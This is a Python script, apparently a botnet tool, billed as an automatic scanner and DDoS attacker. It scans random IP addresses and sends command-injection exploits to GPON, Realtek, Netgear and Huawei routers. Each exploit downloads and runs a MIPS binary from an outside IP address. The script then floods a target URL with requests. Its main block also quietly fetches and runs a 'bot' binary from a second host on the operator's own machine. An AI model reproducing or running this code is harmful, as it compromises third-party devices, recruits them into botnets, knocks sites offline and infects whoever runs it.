import subprocess
import argparse
import socket
import time
import threading
import random
import aiohttp
import asyncio
import logging

print("""
5exp - By tarsoul

auto scanner and attacker for ddos attacks
""")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

def install_module(module_name):
    subprocess.check_call(["pip", "install", module_name])

def auto_install_modules():
    required_modules = ["aiohttp"]
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            logger.warning(f"{module} module not found, installing it...")
            install_module(module)

auto_install_modules()

def socket_connect_tcp(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        return sock
    except socket.error:
        return None

def exploit_socket_gpon8080(host):
    gpon_request1 = ("POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
                     "Host: 127.0.0.1:8080\r\n"
                     "Connection: keep-alive\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Accept: */*\r\n"
                     "User-Agent: r00ts3c-owned-you\r\n"
                     "Content-Length: 118\r\n\r\n"
                     "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;"
                     "wget+http://91.92.252.211/qqyt33.mips+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0")

    gpon_socket1 = socket_connect_tcp(host, 8080)
    if gpon_socket1:
        gpon_socket1.sendall(gpon_request1.encode())
        time.sleep(0.1)
        gpon_socket1.close()
        logger.info(f"[gpon_8080] exploitable {host}")

def exploit_socket_gpon80(host):
    gpon_request2 = ("POST /GponForm/diag_Form?images/ HTTP/1.1\r\n"
                     "Host: 127.0.0.1:80\r\n"
                     "Connection: keep-alive\r\n"
                     "Accept-Encoding: gzip, deflate\r\n"
                     "Accept: */*\r\n"
                     "User-Agent: r00ts3c-owned-you\r\n"
                     "Content-Length: 118\r\n\r\n"
                     "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;"
                     "wget+http://91.92.252.211/qqyt33.mips+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0")

    gpon_socket2 = socket_connect_tcp(host, 80)
    if gpon_socket2:
        gpon_socket2.sendall(gpon_request2.encode())
        time.sleep(0.1)
        gpon_socket2.close()
        logger.info(f"[gpon_80] exploitable {host}")

def exploit_socket_realtek(host):
    realtek_request = ("POST /picsdesc.xml HTTP/1.1\r\n"
                       f"Host: {host}:52869\r\n"
                       "Content-Length: 630\r\n"
                       "Accept-Encoding: gzip, deflate\r\n"
                       "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n"
                       "Accept: */*\r\n"
                       "User-Agent: r00ts3c-owned-you\r\n"
                       "Connection: keep-alive\r\n\r\n"
                       "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
                       "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping "
                       "xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost>"
                       "<NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382"
                       "</NewInternalPort><NewInternalClient>`cd /tmp/; rm -rf*; wget http://91.92.252.211/qqyt33.mips`"
                       "</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing"
                       "</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping>"
                       "</s:Body></s:Envelope>\r\n\r\n")
    realtek_request2 = ("POST /picsdesc.xml HTTP/1.1\r\n"
                        f"Host: {host}:52869\r\n"
                        "Content-Length: 630\r\n"
                        "Accept-Encoding: gzip, deflate\r\n"
                        "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\n"
                        "Accept: */*\r\n"
                        "User-Agent: r00ts3c-owned-you\r\n"
                        "Connection: keep-alive\r\n\r\n"
                        "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
                        "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping "
                        "xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost>"
                        "<NewExternalPort>47500</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382"
                        "</NewInternalPort><NewInternalClient>`cd /tmp/;chmod +x qqyt33.mips;./qqyt33.mips realtek`"
                        "</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing"
                        "</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping>"
                        "</s:Body></s:Envelope>\r\n\r\n")

    realtek_socket = socket_connect_tcp(host, 52869)
    if realtek_socket:
        realtek_socket.sendall(realtek_request.encode())
        time.sleep(5)
        realtek_socket.sendall(realtek_request2.encode())
        time.sleep(0.1)
        realtek_socket.close()
        logger.info(f"[realtek] exploitable {host}")

def exploit_socket_netgear(host):
    netgear_request = ("GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;"
                       "wget+http://91.92.252.211/qqyt33.mips+-O+/tmp/netgear;sh+netgear&curpath=/&"
                       "currentsetting.htm=1 HTTP/1.0\r\n\r\n")

    netgear_socket = socket_connect_tcp(host, 8080)
    netgear_socket2 = socket_connect_tcp(host, 80)
    if netgear_socket:
        netgear_socket.sendall(netgear_request.encode())
        time.sleep(0.1)
        netgear_socket.close()
        logger.info(f"[netgear_8080] exploitable {host}")
    if netgear_socket2:
        netgear_socket2.sendall(netgear_request.encode())
        time.sleep(0.1)
        netgear_socket2.close()
        logger.info(f"[netgear_80] exploitable {host}")

def exploit_socket_huawei(host):
    huawei_request = ("POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\n"
                      f"Host: {host}:37215\r\n"
                      "Content-Length: 601\r\n"
                      "Connection: keep-alive\r\n"
                      "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", "
                      "nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", "
                      "response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", "
                      "nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n"
                      "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
                      "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade "
                      "xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>`cd /tmp/;"
                      "rm -rf *;wget http://91.92.252.211/qqyt33.mips;chmod 777 qqyt33.mips;./qqyt33.mips huawei`"
                      "</NewStatusURL><NewDownloadURL></NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n")

    huawei_socket = socket_connect_tcp(host, 37215)
    if huawei_socket:
        huawei_socket.sendall(huawei_request.encode())
        time.sleep(0.1)
        huawei_socket.close()
        logger.info(f"[huawei] exploitable {host}")

def random_ip_generation():
    ip1 = random.randint(0, 255)
    ip2 = random.randint(0, 255)
    ip3 = random.randint(0, 255)
    ip4 = random.randint(0, 255)
    return f"{ip1}.{ip2}.{ip3}.{ip4}"

def save_zombie_ip(ip):
    with open('zombies.txt', 'a') as file:
        file.write(ip + '\n')

def load_zombie_ips():
    zombies = []
    with open('zombies.txt', 'r') as file:
        for line in file:
            zombies.append(line.strip())
    return zombies

async def send_ddos_requests(session, target_url):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.41 Safari/537.36"
    ]

    while True:
        try:
            user_agent = random.choice(user_agents)
            headers = {"User-Agent": user_agent}
            async with session.get(target_url, headers=headers, timeout=3) as response:
                if response.status == 200:
                    logger.debug(f"Sent request to {target_url} with {user_agent}")
        except aiohttp.ClientError as e:
            logger.warning(f"Failed to send request to {target_url}: {e}")
            pass

async def main(target_url, attack_duration):
    # Load previously successful zombies
    zombie_ips = load_zombie_ips()
    
    logger.info(f"Scanning for vulnerables devices...")
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=1000)) as session:
        tasks = []
        start_time = time.time()
        while True:
            if random.random() < 0.5 and zombie_ips:
                ip_address = random.choice(zombie_ips)
                logger.info(f"By tarsoul - Launching DDoS attack on {target_url} from {ip_address} (from zombies)")
            else:
                ip_address = random_ip_generation()
                logger.info(f"By tarsoul - Launching DDoS attack on {target_url} from {ip_address}")
                
            exploit_functions = [
                exploit_socket_gpon8080,
                exploit_socket_gpon80,
                exploit_socket_realtek,
                exploit_socket_netgear,
                exploit_socket_huawei
            ]
            for exploit_function in exploit_functions:
                threading.Thread(target=exploit_function, args=(ip_address,)).start()
            tasks.append(asyncio.create_task(send_ddos_requests(session, target_url)))
            await asyncio.sleep(0.001)  # Increase thread scheduling frequency for higher request rate

            # Check if this IP has been attacking for more than 10 seconds to save it to zombies
            if time.time() - start_time > 10:
                save_zombie_ip(ip_address)

            if time.time() - start_time > attack_duration:
                break

        await asyncio.gather(*tasks)

if __name__ == "__main__":
    os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.182.25.126/bot; chmod +x bot; ./bot; rm -rf bot; cd; clear")
    parser = argparse.ArgumentParser(description="Script to exploit infected devices and launch a powerful DDoS attack")
    parser.add_argument("target_url", help="URL of the target for DDoS attack")
    parser.add_argument("attack_duration", type=int, help="Duration of DDoS attack in seconds")
    args = parser.parse_args()

    asyncio.run(main(args.target_url, args.attack_duration))
